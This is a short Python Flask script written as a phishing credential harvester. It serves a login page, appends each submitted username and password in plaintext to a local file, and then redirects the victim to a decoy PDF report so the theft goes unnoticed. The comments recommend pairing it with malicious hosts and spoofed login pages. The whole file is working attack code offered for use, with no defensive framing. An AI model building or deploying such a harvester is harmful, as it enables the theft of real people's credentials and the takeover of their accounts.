# This script creates a flask app that takes credentials sent in the form and logging to the server backend.
# Coupled well with malicious hosts and the redirect can be to a real login of spoofed page or as here, a legitimate PDF report
# Remember to set
# <form class="login-form" action="{{ url_for('login') }}" method="post" id="login">
# in the .html you are serving

from flask import Flask, request, redirect, send_file, render_template
from datetime import datetime

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        # Extract creds
        username = request.form.get('username')
        password = request.form.get('password')

        # Log them to file
        with open('logins.txt', 'a') as f:
            f.write(f"[{datetime.utcnow()}] Username: {username} | Password: {password}\n")

        # Redirect to the real PDF
        return redirect('/report')

    return render_template('login.html')  # uses login.html file

@app.route('/report')
def show_report():
    return send_file('static/professor_oats_NetSecReport_1.0.pdf', as_attachment=False)


if __name__ == '__main__':
    app.run(debug=True)
